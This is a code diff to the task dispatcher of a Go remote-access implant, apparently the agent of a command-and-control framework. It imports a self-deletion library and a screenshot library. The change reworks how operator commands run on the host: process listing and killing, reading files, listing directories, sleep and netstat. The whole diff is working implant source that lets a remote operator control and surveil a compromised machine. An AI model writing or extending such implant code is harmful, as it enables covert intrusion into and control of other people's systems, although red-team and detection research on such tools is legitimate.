@@ -2,6 +2,7 @@ package check
 
 import (
 	"bytes"
+	"context"
 	"dingo/hg"
 	"dingo/initialization"
 	"dingo/tasks"
@@ -15,9 +16,11 @@ import (
 	"path"
 	"strconv"
 	"strings"
+	"text/tabwriter"
 	"time"
 
 	selfdelete "github.com/secur30nly/go-self-delete"
+	"github.com/shirou/gopsutil/v3/process"
 	"github.com/vova616/screenshot"
 )
 
@@ -44,15 +47,47 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 		case "hostname":
 			data, _ = hg.GetHostname()
 		case "ps":
-			data, _ = hg.PsReturnT("tasklist", TokenLinked)
+			processes, _ := hg.GetAllProcesses()
+
+			var usernames []string = []string{" User ", "======"}
+			var pids []string = []string{" PID ", "====="}
+			var procNames []string = []string{" Name ", "======"}
+
+			for _, proc := range processes {
+				user, _ := proc.Username()
+				pid := fmt.Sprint(proc.Pid)
+				procName, _ := proc.Name()
+
+				usernames = append(usernames, user)
+				pids = append(pids, pid)
+				procNames = append(procNames, procName)
+			}
+
+			outputBuffer := bytes.NewBufferString("")
+			writer := tabwriter.NewWriter(outputBuffer, 0, 0, 1, ' ', 0)
+			for key := range usernames {
+				fmt.Fprintln(writer, usernames[key]+"\t"+pids[key]+"\t"+procNames[key]+"\t")
+			}
+			writer.Flush()
+
+			data = outputBuffer.String()
 		case "ifconfig":
 			data, _ = hg.PsReturnT("ipconfig", TokenLinked)
 		case "kill":
 			pid := taskData
-			hg.PsNoOutT("Stop-Process -Id "+pid, TokenLinked)
-			data = fmt.Sprintf("killed process (%s)", pid)
+
+			var ctx context.Context
+			procsWithCtx, _ := process.ProcessesWithContext(ctx)
+
+			for _, proc := range procsWithCtx {
+				if fmt.Sprint(proc.Pid) == pid {
+					proc.KillWithContext(ctx)
+					data = fmt.Sprintf("killed process (%s)", pid)
+					break
+				}
+			}
 		case "cat":
-			data, _ = hg.PsReturnT("type "+taskData, TokenLinked)
+			data, _ = hg.ReadFileToString(taskData)
 		case "sleep":
 			newSleepTime := taskData
 			*sleep, _ = strconv.Atoi(newSleepTime)
@@ -111,7 +146,11 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 		case "pwd":
 			data, _ = hg.GetPwd()
 		case "ls":
-			data, _ = hg.PsReturnT("dir "+taskData, TokenLinked)
+			files, _ := hg.ListFiles(taskData)
+
+			for _, file := range files {
+				data += file + "\n"
+			}
 		case "cd":
 			os.Chdir(taskData)
 			data = fmt.Sprintf("changed directory to %s", taskData)
@@ -210,7 +249,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 
 			data = "copied file"
 		case "netstat":
-			data, _ = hg.PsReturnT("netstat -ano", TokenLinked)
+			data = "not supported yet"
 		case "rm":
 			file, err := os.Open(taskData)
 			if err != nil {
@@ -249,7 +288,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 				break
 			}
 
-			data = "ccreated directory"
+			data = "created directory"
 		default:
 			data = "command not supported"
 		}
